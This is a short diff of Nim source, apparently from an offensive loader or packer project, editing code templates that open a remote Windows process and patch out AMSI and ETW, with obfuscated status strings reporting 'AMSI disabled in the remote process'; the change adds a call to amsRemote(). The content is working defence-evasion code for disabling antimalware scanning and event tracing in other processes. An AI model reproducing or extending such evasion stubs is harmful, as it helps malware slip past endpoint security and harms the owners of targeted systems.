@@ -631,6 +631,7 @@ let RemotePatchAMSIStub* = """
         when defined(verbose):
             echo obf("[*] NtOpenProcess: "), toHex(status)
         #var hProcams = OpenProcess(PROCESS_ALL_ACCESS, FALSE, remoteProcID)
+
         success = RemotePatchAmsi(hProcams)
         if (success == 0):
             success = remoteLoadAmsi(remoteProcID)
@@ -638,6 +639,8 @@ let RemotePatchAMSIStub* = """
             success = RemotePatchAmsi(hProcams)
         when defined(verbose):
             echo obf("[*] AMSI disabled in the remote process: ") & fmt"{bool(success)}"
+
+amsRemote()
 
 """
 
@@ -1019,6 +1022,7 @@ let RemotePatchETWStub* = """
             success = RemotePatchETW(hProcams)
         when defined(verbose):
             echo obf("[*] ETW disabled in the remote process: ") & fmt"{bool(success)}"
+
 
 """
 
